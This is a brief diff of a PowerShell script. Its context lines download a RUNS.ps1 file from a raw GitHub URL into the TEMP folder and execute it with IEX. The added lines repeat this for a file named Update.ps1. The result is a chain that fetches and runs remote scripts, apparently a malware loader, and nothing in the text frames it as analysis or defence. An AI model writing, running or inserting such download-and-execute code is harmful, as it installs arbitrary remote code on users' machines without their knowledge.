@@ -5,3 +5,7 @@ $url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNS.ps1"
 $output5 = "$env:TEMP\RUNS.ps1"
 Invoke-WebRequest -Uri $url5 -OutFile $output5
 IEX ((New-Object Net.WebClient).DownloadString($output5))
+$url6 = "https://raw.githubusercontent.com/cia168168/folder/main/Update.ps1"
+$output6 = "$env:TEMP\Update.ps1"  # Corrected variable name
+Invoke-WebRequest -Uri $url6 -OutFile $output6
+IEX ((New-Object Net.WebClient).DownloadString($output6))
